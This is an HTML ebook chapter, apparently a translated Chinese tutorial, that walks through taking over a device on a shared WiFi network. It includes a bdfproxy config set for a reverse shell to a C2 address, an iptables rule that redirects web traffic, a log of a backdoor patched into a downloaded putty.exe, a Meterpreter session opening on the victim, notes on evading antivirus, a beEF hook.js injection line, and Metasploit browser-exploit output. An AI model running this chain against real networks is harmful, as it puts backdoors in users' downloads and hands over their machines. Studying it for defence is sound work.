@@ -1,0 +1,238 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>Wifi高级组合技&一套连击拿SHELL</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>Wifi高级组合技&一套连击拿SHELL</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&amp;mid=208075343&amp;idx=1&amp;sn=b560024f2b59de862d1c4fe0a311948d&amp;chksm=12279fab255016bded6ecb65a4beb99534974cbacb5e885291db2591de49737e895a6c9448c1&amp;scene=27#wechat_redirect">http://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&amp;mid=208075343&amp;idx=1&amp;sn=b560024f2b59de862d1c4fe0a311948d&amp;chksm=12279fab255016bded6ecb65a4beb99534974cbacb5e885291db2591de49737e895a6c9448c1&amp;scene=27#wechat_redirect</a></blockquote><p><span style="color: rgb(127, 127, 127);"/></p><h1><span style="font-size: 14px;">0x00 概述</span></h1><hr/><p><span style="font-size: 14px;">十步之外，可取汝SHELL</span></p><p><span style="font-size: 14px;">本文介绍了使用WooyunWifi+BDFproxy+Metasploit的GETSHELL工具组合，并介绍了BDF的原理，并简要介绍了WooyunWifi+beEF+Metasploit的GETSHELL组合及其原理</span></p><p><span style="font-size: 14px;">本文使用的工具及缩写一览：</span></p><p><span style="font-size: 14px;">Backdoor Factory（后门工厂），缩写：bdf</span></p><p><span style="font-size: 14px;">Backdoor Factory Proxy（后门工厂代理器），缩写：bdfproxy</span></p><p><span style="font-size: 14px;">The Browser Exploitation Framework（浏览器漏洞利用框架），缩写：beEF</span></p><h1><span style="font-size: 14px;">0x01 WooyunWifi相关功能简介</span></h1><hr/><p><span style="font-size: 14px;">WooyunWifi路由器是一款用于无线网络安全测试&amp;学习的智能路由器</span></p><p><span style="font-size: 14px;">在本文中，分别使用了WooyunWifi的流量转发功能、JS注入功能</span></p><p><span style="font-size: 14px;">流量转发功能可以让目标设备的流量转发至进行实际执行安全测试工具的设备上，即提供了免配置的中间人网络介入。中间人攻击的传统手法有ARP欺骗、DNS欺骗等，均需要其他安全工具配合，难度较大且物理条件要求苛刻（需要额外的设备接入同一网段，并且要关闭可能的Lan隔离及ARP防火墙）。因此，WooyunWifi提供的一键流量转发功能可以使您跳过网络层手工配置，直接使用任意设备对目标设备进行应用层的安全测试</span></p><p><span style="font-size: 14px;">JS注入功能可以提供简单的脚本注入，可以用来做启动更大脚本HOOK平台的跳板，举例说本文中介绍的beEF平台就是由JS注入功能初始化，然后直接HOOK住目标浏览器进行安全测试的。JS注入攻击的传统手法非常复杂，首先需要依赖于上文所说的网络层攻击，之后还要配合应用层的JS注入工具，最后才能开始使用beEF平台，由于前几步骤的难度极高，因此传统上相对更加简单的JS注入反而变得难以实施。因此，WooyunWifi自身集成的安全工具已经实现了JS注入功能，您可以简单地通过WEB界面进行JS注入，简单直接地对目标浏览器进行安全测试。</span></p><h1><span style="font-size: 14px;">0x02 WooyunWifi+BDFproxy+Metasploit测试流程</span></h1><hr/><p><span style="font-size: 14px;">WooyunWifi的WEB配置：</span></p><p><span style="font-size: 14px;">在WooyunWifi的WEB界面中点击Settings（高级设置）按钮，在Traffic Redirect选项中填写流量转发的目标设备IP以及用于安全测试设备的IP，例：</span></p><p><img title="WooyunWificonfig" class="alignnone size-full wp-image-7866" data-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLiccVvJ7jEBud0e5zoOXJfPBWuUxuvc6eHQSIfNAFhmVWdqv6v1ooiahARX6q0AicaBf2feGicFnGmvag/0?wx_fmt=png" data-type="png" data-ratio="0.4495049504950495" data-w="" src="../Images/30291caad67a835443e41f7906429ed7.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLiccVvJ7jEBud0e5zoOXJfPBWuUxuvc6eHQSIfNAFhmVWdqv6v1ooiahARX6q0AicaBf2feGicFnGmvag/0?wx_fmt=png"/></p><p><span style="font-size: 14px;">192.168.1.134 是目标设备的IP，该IP的流量将被转发至Proxy IP</span></p><p><span style="font-size: 14px;">192.168.1.163 是安全测试设备的IP，该IP将接收到来自192.168.1.134的流量</span></p><p><span style="font-size: 14px;">bdfproxy配置：</span></p><p><span style="font-size: 14px;">如果您使用的是Kali Nethunter手机，您已经安装好bdfproxy了。如果您使用的是Kali Linux的老版本（我不确定新版本是否将包含bdfproxy），您可以使用</span></p><pre class="highlight"><span style="font-size: 14px;">apt-get install bdfproxy</span></pre><p><span style="font-size: 14px;">安装bdfproxy以及相关的依赖软件包</span></p><p><span style="font-size: 14px;">默认情况下，您极有可能安装bdfproxy至</span></p><pre class="highlight"><span style="font-size: 14px;">/usr/share/bdfproxy</span></pre><p><span style="font-size: 14px;">如果您是直接从git上获得并编译的源代码，请自己寻找您的bdfproxy配置文件的路径</span></p><p><span style="font-size: 14px;">默认的配置文件可能在/etc/bdfproxy下</span></p><p><span style="font-size: 14px;">修改其中的部分内容如下：</span></p><pre class="highlight"><span style="font-size: 14px;"># 
+#   Author Joshua Pitts the.midnite.runr 'at' gmail &lt;d ot &gt; com
+#   
+#   Copyright (c) 2013-2014, Joshua Pitts
+#   All rights reserved.
+#
+
+bdf以及bdfproxy的作者为Joshua Pitts，联系方式如上，He is awesome!!!
+
+[Overall]
+transparentProxy = transparent  # Modes: None, socks5, transparent, reverse, upstream
+我们使用的是透明代理模式，默认的是常规代理模式，区别是常规代理模式通过浏览器设置代理然后通过代理协议传输数据（格式和普通HTTP请求不一样），而透明代理则完全是流量转发格式不变，因此我们在这里使用透明代理
+MaxSizeFileRequested = 100000000 # will send a 502 request of large content to the client (server error)
+最大文件大小，过大的话会返回502页面，建议使用小文件测试
+certLocation = ~/.mitmproxy/mitmproxy-ca.pem
+这是mitm的依赖库需要的证书，如果您遇到的报错和这个有关，先手动运行一下mitmf
+proxyPort = 8080
+sslports = 443, 8443
+loglevel = INFO
+logname = proxy.log
+resourceScript = bdfproxy_msf_resource.rc
+这个是和Metasploit结合的resource文件，之后的命令部分和这个文件名有关
+
+
+[targets]
+//挂马的目标
+    #MAKE SURE that your settings for host and port DO NOT
+    # overlap between different types of payloads
+
+    [[ALL]] # DEFAULT settings for all targets REQUIRED
+
+    LinuxType = ALL     # choices: x86/x64/ALL/None
+    WindowsType = ALL   # choices: x86/x64/ALL/None
+    FatPriority = x64   # choices: x86 or x64
+
+    FileSizeMax = 60000000  # ~60 MB (just under) No patching of files this large
+
+    CompressedFiles = True #True/False
+        [[[LinuxIntelx86]]]
+        SHELL = reverse_shell_tcp   # This is the BDF syntax
+        默认用的是BDF的reverse_shell_tcp，其他选项看BDF文档
+        HOST = 192.168.1.163        # The C2
+        这是PAYLOAD中的LHOST，就是开着Metasploit等着SHELL反弹的设备IP
+        PORT = 8888
+        端口不要和PROXY的重复了
+        SUPPLIED_SHELLCODE = None
+        MSFPAYLOAD = linux/x86/shell_reverse_tcp    # MSF syntax
+        这个是Metasploit的PAYLOAD名称，相当于SET PAYLOAD命令</span></pre><p><span style="font-size: 14px;">配置完毕之后，把Metasploit的服务打开，我们接下来要开启工具了：</span></p><pre class="highlight"><span style="font-size: 14px;">iptables -A PREROUTING -t nat -i eth0 -p tcp -m multiport --dports 80,443 -j REDIRECT --to-port 8080</span></pre><p><span style="font-size: 14px;">以上是第一步：将HTTP/HTTPS流量转发至bdfproxy</span></p><pre class="highlight"><span style="font-size: 14px;">root@Alkaid-PC:~# bdfproxy 
+[!] Writing resource script.
+[!] Resource writen to bdfproxy_msf_resource.rc
+[!] Starting BDFProxy
+[!] Author: @midnite_runr | the[.]midnite).(runr&lt;at&gt;gmail|.|com
+********** REQUEST **********
+[*] HOST:  203.208.48.142
+[*] PATH:  /__utm.gif?utmwv=5.6.5&amp;utms=22&amp;utmn=842124717&amp;utmhn=www.slideshare.net&amp;utmt=event&amp;utme=5(Newsfeed*Featured_time_on_page*440)8(member_type)9(FREE)11(1)&amp;utmcs=UTF-8&amp;utmsr=1920x1080&amp;utmvp=1903x971&amp;utmsc=24-bit&amp;utmul=zh-cn&amp;utmje=1&amp;utmfl=18.0%20r0&amp;utmdt=lxj616%E2%80%99s%20Newsfeed&amp;utmhid=1466934019&amp;utmr=http%3A%2F%2Fmail.qq.com%2Fcgi-bin%2Freadtemplate%3Ft%3Dsafety%26check%3Dfalse%26gourl%3Dhttp%253A%252F%252Fwww.slideshare.net%252Fconfirm%252FODEwNDQ5Njg7MDA2Zjg0OWMzNjZiZmRmYTc0YWIwYzQyNzcyZGIzMjhjZTA2YmI5MA%253D%253D%253Futm_source%253Dconfirmemail%2526utm_medium%253Dssemail%2526utm_campaign%253Dconfirm_email%26subtemplate%3Dgray%26evil%3D0&amp;utmp=%2Flxj616%2Fnewsfeed%3Fredirect%3D1&amp;utmht=1439103172080&amp;utmac=UA-2330466-1&amp;utmni=1&amp;utmcc=__utma%3D186399478.1272612003.1439088302.1439089490.1439090092.3%3B%2B__utmz%3D186399478.1439089490.2.2.utmcsr%3Dgoogle%7Cutmccn%3D(organic)%7Cutmcmd%3Dorganic%7Cutmctr%3D(not%2520provided)%3B&amp;utmjid=&amp;utmu=6RCAACAAAAAAAAAAAAAAAAAE~
+********** END REQUEST **********</span></pre><p><span style="font-size: 14px;">以上是第二步：开启bdfproxy，如果您配置正确，在目标设备访问网页时可以看到bdfproxy中截获的REQUEST如上所示</span></p><pre class="highlight"><span style="font-size: 14px;">********** REQUEST **********
+[*] HOST:  221.204.160.47
+[*] PATH:  /sw-search-sp/soft/78/15699/putty_V0.63.0.0.43510830.exe
+********** END REQUEST **********
+========== RESPONSE ==========
+[*] HOST:  221.204.160.47
+[*] PATH:  /sw-search-sp/soft/78/15699/putty_V0.63.0.0.43510830.exe
+[*] In the backdoor module
+[*] Checking if binary is supported
+[*] Gathering file info
+[*] Reading win32 entry instructions
+[*] Looking for and setting selected shellcode
+[*] Creating win32 resume execution stub
+[*] Looking for caves that will fit the minimum shellcode length of 638
+[*] All caves lengths:  (638,)
+############################################################
+The following caves can be used to inject code and possibly
+continue execution.
+**Don't like what you see? Use jump, single, append, or ignore.**
+############################################################
+[*] Cave 1 length as int: 638
+[*] Available caves: 
+1. Section Name: None; Section Begin: None End: None; Cave begin: 0x294 End: 0xffc; Cave Size: 3432
+2. Section Name: .rdata; Section Begin: 0x57000 End: 0x73000; Cave begin: 0x7262c End: 0x73000; Cave Size: 2516
+3. Section Name: None; Section Begin: None End: None; Cave begin: 0x743d0 End: 0x7500a; Cave Size: 3130
+**************************************************
+[!] Enter your selection: 2
+[!] Using selection: 2
+[*] Changing Section Flags
+[*] Patching initial entry instructions
+[*] Creating win32 resume execution stub
+[*] Looking for and setting selected shellcode
+[*] Patching complete, forwarding to user.
+========== END RESPONSE ==========</span></pre><p><span style="font-size: 14px;">在目标设备通过HTTP下载文件时，您将在bdfproxy中看到拦截下的请求，提示您选择注入的CAVE，这里上面我选择了2，输入2然后回车，目标设备这时成功下载到putty.exe，看上去毫无异样。</span></p><p><img title="normalvideo" class="alignnone size-full wp-image-7867" data-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLiccVvJ7jEBud0e5zoOXJfPBV25NJZDqDUnsL6OfklHpWVcb2wAevuVEr8KbFoO6OJJ16iakS4LeibQw/0?wx_fmt=png" data-type="png" data-ratio="0.5386138613861386" data-w="" src="../Images/7edb16b30ed260dba1bac3e2e2d594a5.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLiccVvJ7jEBud0e5zoOXJfPBV25NJZDqDUnsL6OfklHpWVcb2wAevuVEr8KbFoO6OJJ16iakS4LeibQw/0?wx_fmt=png"/></p><p><span style="font-size: 14px;">以上截图出自WooyunWifi 2.0的视频，目前版本已经到达3.0，除了功能增强也有一个全新界面了</span></p><p><span style="font-size: 14px;">先不解释发生了什么，我们先来启动Metasploit：</span></p><pre class="highlight"><span style="font-size: 14px;">root@Alkaid-PC:/usr/share/bdfproxy# msfconsole -r ./bdfproxy_msf_resource.rc 
+</span></pre><p><span style="font-size: 14px;">请注意，这里的bdfproxy_msf_resource.rc正是我们上文中设置文件的名称，可能位于/usr/share/bdfproxy下面，如果您自己编译的bdfproxy，那您需要自己找这文件放哪里了</span></p><pre class="highlight"><span style="font-size: 14px;">[*] Started reverse handler on 192.168.1.163:5555 
+[*] Starting the payload handler...
+msf exploit(handler) &gt; [*] Sending stage (770048 bytes) to 192.168.1.134
+[*] Meterpreter session 1 opened (192.168.1.163:8443 -&gt; 192.168.1.134:57625) at 2015-08-09 14:58:22 +0800</span></pre><p><span style="font-size: 14px;">可以看到启动时开启了一堆handler等待bdfproxy使用，当目标设备运行putty.exe时，显示Meterpreter session 1 opened，这时已经获取到了目标设备的SHELL</span></p><pre class="highlight"><span style="font-size: 14px;">msf exploit(handler) &gt; sessions -l
+
+Active sessions
+===============
+
+  Id  Type   Information   Connection
+  --  ----   -----------   ----------
+  1   meterpreter x86/win32  FullMatelErLuLu\OrgeDaLuLu @ FULLMATELERLULU  192.168.1.163:8443 -&gt; 192.168.1.134:57625 (192.168.1.134)</span></pre><p><span style="font-size: 14px;">具体拿到SHELL之后怎么用，请参阅Metasploit的文档，这里就不细说了</span></p><h1><span style="font-size: 14px;">0x03 BDF原理分析</span></h1><hr/><p><span style="font-size: 14px;">首先，我们来看看我们大概做了一件什么事情：</span></p><p><span style="font-size: 14px;">目标设备-&gt;WooyunWifi路由器-&gt;安全测试设备（Kali+bdfproxy）-&gt;网站</span></p><p><span style="font-size: 14px;">那么发生了什么事情呢？</span></p><p><span style="font-size: 14px;">目标设备请求putty.exe-&gt;WooyunWifi路由器转发-&gt;安全测试设备（bdfproxy）拦截到请求-&gt;bdfproxy根据配置请求BDF挂后门-&gt;BDF请求Metasploit生成后门SHELLCODE-&gt;把SHELLCODE填进CAVE中（一会儿解释）-&gt;响应发回目标设备-&gt;目标设备下载完无异常于是执行-&gt;执行SHELLCODE-&gt;反弹SHELL给Metasploit</span></p><p><span style="font-size: 14px;">大家最关心的肯定是BDF挂后门时的CAVE是什么意思，下面以Joshua Pitts（BDF作者，He is awesome！！！）的PPT来翻译讲解BDF的原理，给出PPT原地址，翻译时格式有改动内容有删改：</span></p><p><span style="font-size: 14px;">http://www.slideshare.net/midnite_runr/patching-windows-executables-with-the-backdoor-factory</span></p><p><span style="font-size: 14px;">Metasploit挂后门的方式：</span></p><pre class="highlight"><span style="font-size: 14px;">msfvenom –p windows/shell_reverse_tcp –x psexec.exe … 这是覆盖掉原来程序入口点的方式
+
+msfvenom –p windows/shell_reverse_tcp –x psexec.exe –k … 这是分配并创建一个新的线程然后跳转回原始程序入口点的方式（Keep 保留方式）</span></pre><p><span style="font-size: 14px;">覆盖掉程序入口点之前：</span></p><p><img title="before_overwrite" class="alignnone size-full wp-image-7868" data-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLiccVvJ7jEBud0e5zoOXJfPBlzpRy3sqQxLpqibH5PxsD0P3eO8yxXcJjncQfu1bxhTdoySKENk5D8Q/0?wx_fmt=png" data-type="png" data-ratio="0.7116883116883117" data-w="385" src="../Images/398434571a776d2fdf6c178d9b19cee5.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLiccVvJ7jEBud0e5zoOXJfPBlzpRy3sqQxLpqibH5PxsD0P3eO8yxXcJjncQfu1bxhTdoySKENk5D8Q/0?wx_fmt=png"/></p><p><span style="font-size: 14px;">覆盖掉程序入口点之后：</span></p><p><img title="after" class="alignnone size-full wp-image-7869" data-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLiccVvJ7jEBud0e5zoOXJfPBQ9UD5A0XwaDElE5BhUdicRPV9o1w6PIahS4bCToFYKS0PJLt255cGiaw/0?wx_fmt=png" data-type="png" data-ratio="0.7816711590296496" data-w="371" src="../Images/837868d674193935db5e01df1bbba640.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLiccVvJ7jEBud0e5zoOXJfPBQ9UD5A0XwaDElE5BhUdicRPV9o1w6PIahS4bCToFYKS0PJLt255cGiaw/0?wx_fmt=png"/></p><p><span style="font-size: 14px;">覆盖程序入口点方式的好处和弊端：</span></p><pre class="highlight"><span style="font-size: 14px;">好处：攻击者可以拿到SHELL
+好处：EXE文件大小没有改变
+坏处：程序无法继续执行（崩掉了）</span></pre><p><span style="font-size: 14px;">创建新线程但是保留程序入口点方法：</span></p><p><img title="after_keep" class="alignnone size-full wp-image-7870" data-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLiccVvJ7jEBud0e5zoOXJfPBmCBkumpcaOkZEoxXn9BPezrfzw25Yy4T8fUy4poO1c7L8sN8H3N8pA/0?wx_fmt=png" data-type="png" data-ratio="0.11959287531806616" data-w="393" src="../Images/88f79db0b83021c8aab4e6cf976fd7f8.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLiccVvJ7jEBud0e5zoOXJfPBmCBkumpcaOkZEoxXn9BPezrfzw25Yy4T8fUy4poO1c7L8sN8H3N8pA/0?wx_fmt=png"/></p><p><span style="font-size: 14px;">可以明显地看到新增了一个RWE的code section</span></p><p><img title="before_keep" class="alignnone size-full wp-image-7871" data-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLiccVvJ7jEBud0e5zoOXJfPB68h42rjP8Hiao66x5Y9po63CVnQYCJuyvuRXU5jOnXOSG8yb7V7x3IA/0?wx_fmt=png" data-type="png" data-ratio="0.14432989690721648" data-w="388" src="../Images/eecb56727ba3f9fb73f7a36ae8d2e921.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLiccVvJ7jEBud0e5zoOXJfPB68h42rjP8Hiao66x5Y9po63CVnQYCJuyvuRXU5jOnXOSG8yb7V7x3IA/0?wx_fmt=png"/></p><p><span style="font-size: 14px;">创建新线程但是保留程序入口点方法的好处和弊端：</span></p><pre class="highlight"><span style="font-size: 14px;">好处：拿到SHELL并且程序可以继续执行
+坏处：容易被杀毒软件侦测到
+坏处：文件大小增加了</span></pre><p><span style="font-size: 14px;">CTP方式挂后门：</span></p><p><span style="font-size: 14px;">添加一个新的code section，这和保留程序入口点的msfvenom Keep方式相似，然后使用存在的code Caves来加解密新加的code section中的SHELLCODE（我们尝试过xor加密，但是已经对杀毒软件没啥用了）</span></p><p><img title="ctp" class="alignnone size-full wp-image-7872" data-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLiccVvJ7jEBud0e5zoOXJfPBXNXdok75VRWV33qtoepKAffwgRlCakW6ia2ASYDibwovFYqCBuTme8Zw/0?wx_fmt=png" data-type="png" data-ratio="0.6574257425742574" data-w="" src="../Images/f8f32c70a31fd64e46ef13782b46317b.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLiccVvJ7jEBud0e5zoOXJfPBXNXdok75VRWV33qtoepKAffwgRlCakW6ia2ASYDibwovFYqCBuTme8Zw/0?wx_fmt=png"/></p><p><span style="font-size: 14px;">译者注：上图与keep方式比较相似，先跳到新加的code section然后跳回原来的程序入口点</span></p><p><span style="font-size: 14px;">那么，什么是Code Caves 呢？</span></p><p><img title="cc1" class="alignnone size-full wp-image-7873" data-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLiccVvJ7jEBud0e5zoOXJfPBhuyOIMMPYZxL5ZpWI9WhgVWBEyI1lcct4Qe6jCt3kNgZ8IKGYQbDGw/0?wx_fmt=png" data-type="png" data-ratio="0.2576419213973799" data-w="458" src="../Images/6517d070578fab7f28ebdb22a56ddd32.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLiccVvJ7jEBud0e5zoOXJfPBhuyOIMMPYZxL5ZpWI9WhgVWBEyI1lcct4Qe6jCt3kNgZ8IKGYQbDGw/0?wx_fmt=png"/></p><p><span style="font-size: 14px;">Code Cave 是指在一个二进制文件中存在的一个全都是空字节（x00）的区域</span></p><p><span style="font-size: 14px;">编者注：如上图一堆x00的区域，就是一个Code Cave</span></p><p><span style="font-size: 14px;">Code Cave的产生与编译器有关：</span></p><pre class="highlight"><span style="font-size: 14px;">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;windows.h&gt;
+
+int array[600] = {0};
+
+int main(int argc, char **argv)
+{
+    printf("hello world");
+    return 0;
+}</span></pre><p><span style="font-size: 14px;">不同编译器下在section中大于200字节的Code Caves个数：</span></p><pre class="highlight"><span style="font-size: 14px;">Cl.exe :  7
+G++: 4
+Mingw32-c++: 3
+Lcc-win32: 0</span></pre><p><span style="font-size: 14px;">BDF工作原理：</span></p><pre class="highlight"><span style="font-size: 14px;">识别PE/COFF头格式
+
+识别是否支持该二进制文件格式(win32/64 intel)
+
+定位适用于指定SHELLCODE的Code Caves
+
+试着挂后门并且让程序跳回原来状态继续执行
+
+把入口点用JMP指到第一个选择的Code Cave或者添加的code section来挂到每个用户选择的Code Cave中</span></pre><p><span style="font-size: 14px;">使用自定的SHELLCODE：</span></p><pre class="highlight"><span style="font-size: 14px;">提醒一点，最好使用ExitFunction=Thread不然就会杀掉父进程，这样BDF就没用了</span></pre><p><span style="font-size: 14px;">最后，对比一下文中所述的三种挂后门方式：</span></p><p><span style="font-size: 14px;">MSFVENOM –k –t exe</span></p><p><img title="vs001" class="alignnone size-full wp-image-7874" data-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLiccVvJ7jEBud0e5zoOXJfPBb9dEF2LEol28Vf4xFUL019gibOmNjKAcs84eF6N8ibosj52K5jQfKSJQ/0?wx_fmt=png" data-type="png" data-ratio="0.2871287128712871" data-w="" src="../Images/c44acbe57255bd4fcb2b47408ea801bc.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLiccVvJ7jEBud0e5zoOXJfPBb9dEF2LEol28Vf4xFUL019gibOmNjKAcs84eF6N8ibosj52K5jQfKSJQ/0?wx_fmt=png"/></p><p><span style="font-size: 14px;">MSFVENOM –t exe</span></p><p><img title="vs002" class="alignnone size-full wp-image-7875" data-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLiccVvJ7jEBud0e5zoOXJfPBADFAwrhlAMSRb0jOc8tw5sAZNic312ffgVRbJLRtsUT08XNDoPy4U5g/0?wx_fmt=png" data-type="png" data-ratio="0.2633663366336634" data-w="" src="../Images/7a12eacb3a59975952401b22d6fe913d.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLiccVvJ7jEBud0e5zoOXJfPBADFAwrhlAMSRb0jOc8tw5sAZNic312ffgVRbJLRtsUT08XNDoPy4U5g/0?wx_fmt=png"/></p><p><span style="font-size: 14px;">BDF Cave jumping</span></p><p><img title="vs003" class="alignnone size-full wp-image-7876" data-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLiccVvJ7jEBud0e5zoOXJfPBLewTSukuyK4vgEoZRzmxIMSDpzfCG1JQxLrklbK1naR1YibsGMYohZA/0?wx_fmt=png" data-type="png" data-ratio="0.24356435643564356" data-w="" src="../Images/7e87215a4af860408b3a055337b7492f.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLiccVvJ7jEBud0e5zoOXJfPBLewTSukuyK4vgEoZRzmxIMSDpzfCG1JQxLrklbK1naR1YibsGMYohZA/0?wx_fmt=png"/></p><p><span style="font-size: 14px;">然后对比一下32位挂后门和64位挂后门的效果：</span></p><p><img title="vs004" class="alignnone size-full wp-image-7877" data-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLiccVvJ7jEBud0e5zoOXJfPBibiciad3D0oPHgtQTVGCe9pmHWwPSAafbMzPstoMTKvN6CJDgk3o9e8WQ/0?wx_fmt=png" data-type="png" data-ratio="0.2891089108910891" data-w="" src="../Images/d6eb818cf3c05f41f99843161700d5f3.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLiccVvJ7jEBud0e5zoOXJfPBibiciad3D0oPHgtQTVGCe9pmHWwPSAafbMzPstoMTKvN6CJDgk3o9e8WQ/0?wx_fmt=png"/></p><p><img title="vs005" class="alignnone size-full wp-image-7878" data-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLiccVvJ7jEBud0e5zoOXJfPBibRln5ulY6NdAdcUF83r59MTRRDB2oTdLf5icw2kVLUDX77YUBTQBcbQ/0?wx_fmt=png" data-type="png" data-ratio="0.2633663366336634" data-w="" src="../Images/083d24030ef9030d35425a19c4fefb9f.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLiccVvJ7jEBud0e5zoOXJfPBibRln5ulY6NdAdcUF83r59MTRRDB2oTdLf5icw2kVLUDX77YUBTQBcbQ/0?wx_fmt=png"/></p><p><span style="font-size: 14px;">因此，BDF在自动化挂后门流程的同时，也实现了CTP方式挂后门的功能，这也就是之前手动选择Code Cave的原因，根据测试结果看来，Cave跳转方式过杀软的效果最好，而64位后门比32位后门的隐蔽性更高</span></p><h1><span style="font-size: 14px;">0x04 WooyunWifi+beEF+Metasploit测试流程</span></h1><hr/><p><span style="font-size: 14px;">WooyunWifi的WEB配置：</span></p><p><span style="font-size: 14px;">在WooyunWifi的WEB界面中点击Settings（高级设置）按钮，在jsInject选项中填写要注入的JS语句，例：</span></p><pre class="highlight"><span style="font-size: 14px;">document.write("&lt;script language='javascript' src='http://192.168.1.163:3000/hook.js'&gt;&lt;/script&gt;");</span></pre><p><img title="beefconfig" class="alignnone size-full wp-image-7879" data-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLiccVvJ7jEBud0e5zoOXJfPBbzz26OicTb4GEabCSwfia0CuRessglqXX7u5ggciada3aIQVeicQ8UM8qA/0?wx_fmt=png" data-type="png" data-ratio="0.5623762376237624" data-w="" src="../Images/7ccd74d73f6ef617ca833c6e49b1c1ba.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLiccVvJ7jEBud0e5zoOXJfPBbzz26OicTb4GEabCSwfia0CuRessglqXX7u5ggciada3aIQVeicQ8UM8qA/0?wx_fmt=png"/></p><p><span style="font-size: 14px;">我们注入的是JS语句，请不要混淆“JS语句”、“HTML标签”和“JS文件”的区别，在beEF中会自动生成hook.js并提示其URL地址，我们要想让beEF成功hook到目标浏览器，就要在目标浏览器上对应页面执行hook.js，因此我们使用JS语法document.write写入一个html标签，然后由标签来在当前页面加载hook.js（js执行的页面对beEF有重大影响，建议以这种方式在当前页面进行hook，您也可以尝试其他方式）</span></p><p><span style="font-size: 14px;">请先启动beef，Kali linux默认情况下集成了beEF，可以通过beef-xss命令启动，或者在快捷启动栏里也可以找到启动器</span></p><p><span style="font-size: 14px;">hook成功后，将在beef“Hooked Browsers”里面弹出上线的浏览器，在这里可以看到详细的浏览器信息</span></p><p><img title="beefpanel" class="alignnone size-full wp-image-7880" data-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLiccVvJ7jEBud0e5zoOXJfPBLeyquU3HIibxpxib5qmicEvVULM2yBQ4US0uszDfxHVtjWrZD7tksrkGg/0?wx_fmt=png" data-type="png" data-ratio="0.5623762376237624" data-w="" src="../Images/f8f82fc2cb220f6b035511316a4085d9.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLiccVvJ7jEBud0e5zoOXJfPBLeyquU3HIibxpxib5qmicEvVULM2yBQ4US0uszDfxHVtjWrZD7tksrkGg/0?wx_fmt=png"/></p><p><span style="font-size: 14px;">如图，目标浏览器为IE 9，并且支持Flash，使用老版本IE还开着Flash这基本上就是随意拿SHELL的了</span></p><p><span style="font-size: 14px;">上www.exploit-db.com找一个最新的exploit，比如hacking team的flash漏洞，放在msf的modules文件夹下，然后按照exploit代码mkdir并且touch一个可读写的swf文件（具体路径可以先运行报错一遍看看在哪）</span></p><p><span style="font-size: 14px;">但是，我是一个口是心非的人，因为我在hacking team事件当天就升级了Flash，降级基本上不可能，而且老版本如果一旦更新就是最新版，实在不想浪费时间去配置个Flash 18.0.0.194特定的版本</span></p><p><span style="font-size: 14px;">让我来用一个比较冷门的exploit演示Metasploit和beEF的组合用法：</span></p><pre class="highlight"><span style="font-size: 14px;">msf exploit(ms14_012_textrange) &gt; use  exploit/windows/browser/ie_unsafe_scripting
+msf exploit(ie_unsafe_scripting) &gt; info
+
+   Name: Microsoft Internet Explorer Unsafe Scripting Misconfiguration
+ Module: exploit/windows/browser/ie_unsafe_scripting
+   Platform: Windows
+   …………
+
+msf exploit(ie_unsafe_scripting) &gt; set SRVHOST 192.168.1.163
+SRVHOST =&gt; 192.168.1.163
+msf exploit(ie_unsafe_scripting) &gt; set payload windows/messagebox
+payload =&gt; windows/messagebox
+msf exploit(ie_unsafe_scripting) &gt; show options
+
+Module options (exploit/windows/browser/ie_unsafe_scripting):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   SRVHOST  192.168.1.163    yes   The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT      8080         yes   The local port to listen on.
+   SSL         false               noNegotiate SSL for incoming connections
+   SSLCert noPath to a custom SSL certificate (default is randomly generated)
+   TECHNIQUE  VBS  yes   Delivery technique (VBS Exe Drop or PSH CMD) (accepted: VBS, Powershell)
+   URIPATH       no                The URI to use for this exploit (default is random)
+
+
+Payload options (windows/messagebox):
+
+   Name  Current Setting   Required  Description
+   ----  ---------------   --------  -----------
+   EXITFUNC  process   yes   Exit technique (accepted: seh, thread, process, none)
